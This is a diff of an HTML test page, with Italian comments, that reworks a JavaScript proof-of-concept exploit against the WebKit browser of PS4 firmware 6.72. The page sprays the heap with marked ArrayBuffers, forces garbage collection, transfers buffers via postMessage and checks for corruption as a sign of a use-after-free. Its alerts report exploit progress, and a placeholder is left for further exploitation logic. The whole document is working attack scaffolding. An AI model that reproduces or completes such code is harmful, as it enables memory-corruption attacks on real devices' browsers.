@@ -1,69 +1,89 @@
 <!DOCTYPE html>
 <html>
+<head>
+    <title>PS4 6.72 Test</title>
+</head>
 <body>
 <script>
-let sprayBuffers = [];
-let retained = { ref: null };
+// Configurazione per PS4 6.72
+const ALLOC_SIZE = 0x400;    // Dimensione ottimale per WebKit vecchio
+const SPRAY_NUM = 5000;      // Adeguato per memorie limitate
+const MAGIC = 0x1337beef;    // Marcatore univoco
 
-function triggerGC() {
-  try {
-    new ArrayBuffer(1024 * 1024 * 100); // Allocazione massiva per forzare il GC
-  } catch(e) {
-    alert("GC Triggered");
-  }
+let spray = [];
+let keepAlive = [];
+
+function gc() {
+    try {
+        let waste = [];
+        for(let i = 0; i < 50000; i++) waste.push(new Uint8Array(ALLOC_SIZE));
+    } catch(e) { alert("GC ERROR: " + e); }
 }
 
-function setupPrimitive() {
-  const arr = [];
-  for (let i = 0; i < 100; i++) {
-    // Usa ArrayBuffer invece di Date (clonabile)
-    arr.push({ 
-      a: new Uint32Array([0x1337]), 
-      b: new ArrayBuffer(16) // Oggetto clonabile
-    });
-  }
-  return arr;
+function setup() {
+    let arr = [];
+    for(let i = 0; i < 50; i++) {
+        arr.push({
+            id: i,
+            buf: new ArrayBuffer(ALLOC_SIZE),
+            marker: MAGIC
+        });
+    }
+    return arr;
 }
 
-function heapSpray() {
-  const marker = 0x41414141;
-  for (let i = 0; i < 1000; i++) {
-    const buf = new ArrayBuffer(1024);
-    new Uint32Array(buf).set([marker]);
-    sprayBuffers.push(buf);
-  }
-  retained.ref = sprayBuffers;
-  alert("HEAP SPRAYED!");
-}
-
-async function main() {
-  try {
-    const vulnerable = setupPrimitive();
-    heapSpray();
-
-    addEventListener('message', (e) => {
-      setTimeout(() => {
-        triggerGC();
-        const corrupted = sprayBuffers.find(buf => 
-          new Uint32Array(buf)[0] !== 0x41414141
-        );
-        
-        if (corrupted) {
-          alert("UAF SUCCESSFUL!");
-          // Aggiungi logica di exploitation qui
+function sprayHeap() {
+    try {
+        for(let i = 0; i < SPRAY_NUM; i++) {
+            let buf = new ArrayBuffer(ALLOC_SIZE);
+            let view = new Uint32Array(buf);
+            view[0] = 0x41414141;
+            view[1] = 0x42424242;
+            spray.push(buf);
         }
-      }, 100);
-    }, { once: true });
-
-    // Invia solo oggetti clonabili (ArrayBuffer)
-    postMessage(vulnerable, '*', vulnerable.map(x => x.b)); 
-    
-  } catch(e) {
-    alert("ERROR: " + e);
-  }
+        keepAlive = spray.slice();
+        alert("[+] Heap spray OK!\nAllocati: " + SPRAY_NUM + " buffer");
+    } catch(e) { alert("[-] Spray failed: " + e); }
 }
 
-setTimeout(main, 2000);
+function checkCorruption() {
+    for(let i = 0; i < spray.length; i++) {
+        let view = new Uint32Array(spray[i]);
+        if(view[0] !== 0x41414141) {
+            alert("[!] Buffer corrotta a index: " + i + 
+                "\nValore: 0x" + view[0].toString(16));
+            return true;
+        }
+    }
+    return false;
+}
+
+function start() {
+    try {
+        alert("[*] Inizio exploit...");
+        let target = setup();
+        sprayHeap();
+
+        addEventListener('message', e => {
+            setTimeout(() => {
+                gc();
+                if(checkCorruption()) {
+                    alert("[+] UAF successo!");
+                    // Aggiungi logica exploit qui
+                } else {
+                    alert("[-] Exploit fallito");
+                }
+            }, 150);
+        }, {once: true});
+
+        postMessage(target, '*', target.map(x => x.buf));
+        alert("[*] Messaggio inviato!");
+
+    } catch(e) { alert("[!] CRASH: " + e); }
+}
+
+// Avvia dopo 3 secondi per caricamento pagina
+setTimeout(start, 3000);
 </script>
 </body>
 </html>
